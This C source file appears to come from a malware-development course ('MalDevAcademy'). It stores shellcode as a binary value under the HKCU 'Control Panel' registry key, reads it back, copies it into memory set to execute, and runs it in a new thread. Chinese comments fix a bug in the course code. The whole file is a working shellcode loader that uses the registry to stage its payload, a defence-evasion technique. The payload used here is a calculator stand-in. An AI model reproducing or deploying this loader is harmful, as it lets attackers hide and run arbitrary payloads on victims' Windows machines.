#include <windows.h>
#include <stdio.h>

// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {
    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = NULL;
    HKEY        hKey = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");

_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {
    LSTATUS     STATUS = NULL;
    DWORD		dwBytesRead = NULL;
    PVOID		pBytes = NULL;

    // Fetching the payload's size
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Allocating heap that will store the payload that will be read
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Reading the payload from "REGISTRY" key, from value "REGSTRING"
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Saving 
    *ppPayload = pBytes;
    *psSize = dwBytesRead;

    return TRUE;
}

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {
    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    //((void(*)(void))pShellcodeAddress)();
    // 课程代码有bug , 主线程可能过早退出，导致子线程没来得及运行
    HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return TRUE;
}

BOOL LoadShellcodeFromFile(const char* filePath, OUT PBYTE* ppShellcode, OUT SIZE_T* psShellcodeSize) {
    FILE* file = fopen(filePath, "rb");
    if (!file) {
        printf("[!] Failed To Open File: %s\n", filePath);
        return FALSE;
    }

    fseek(file, 0, SEEK_END);
    SIZE_T fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    PBYTE buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
    if (!buffer) {
        printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
        fclose(file);
        return FALSE;
    }

    fread(buffer, 1, fileSize, file);
    fclose(file);

    *ppShellcode = buffer;
    *psShellcodeSize = fileSize;

    return TRUE;
}

int main() {
    PBYTE pShellcode = NULL;
    SIZE_T sShellcodeSize = NULL;
    BOOL bSTATE = FALSE;

    // 1. Load Shellcode From File
    bSTATE = LoadShellcodeFromFile("calc.bin", &pShellcode, &sShellcodeSize);
    if (!bSTATE) {
        printf("[!] Failed To Load Shellcode From File ! \n");
        return -1;
    }

    // 2. Write Shellcode To Registry
    bSTATE = WriteShellcodeToRegistry(pShellcode, sShellcodeSize);
    if (!bSTATE) {
        printf("[!] Failed To Write Shellcode To Registry ! \n");
        return -1;
    }

    // Free the shellcode buffer after writing to the registry
    HeapFree(GetProcessHeap(), 0, pShellcode);
    pShellcode = NULL;

    // 3. Read Shellcode From Registry
    bSTATE = ReadShellcodeFromRegistry(&pShellcode, &sShellcodeSize);
    if (!bSTATE) {
        printf("[!] Failed To Read Shellcode From Registry ! \n");
        return -1;
    }

    // 4. Run Shellcode
    bSTATE = RunShellcode(pShellcode, sShellcodeSize);
    if (!bSTATE) {
        printf("[!] Failed To Run Shellcode ! \n");
        return -1;
    }

    // Free the shellcode buffer after execution
    HeapFree(GetProcessHeap(), 0, pShellcode);

    return 0;
}